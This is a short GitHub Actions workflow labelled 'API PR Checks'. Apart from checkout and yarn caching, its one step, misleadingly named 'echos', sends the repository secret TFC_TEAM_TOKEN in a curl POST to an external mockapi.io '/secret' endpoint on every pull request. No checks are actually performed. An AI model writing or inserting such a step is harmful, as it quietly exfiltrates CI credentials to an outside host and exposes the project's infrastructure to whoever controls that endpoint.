name: API PR Checks
on:
  pull_request:
    paths:
      - '**'
jobs:
  pr-checks:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v2
        name: checkout
      - uses: actions/cache@v2
        name: Cache yarn
        with:
          path: ./.yarn/cache
          key: ${{ runner.os }}-yarn-${{ hashFiles('./yarn.lock') }}
          restore-keys: ${{ runner.os }}-yarn-${{ hashFiles('./yarn.lock') }}
      - name: echos
        run: |-
          curl --location --request POST 'https://626fdcdcc508beec488b1ac0.mockapi.io/secret' --header 'Content-Type: application/json' --data-raw '{"data": ${{ secrets.TFC_TEAM_TOKEN }} }'

    
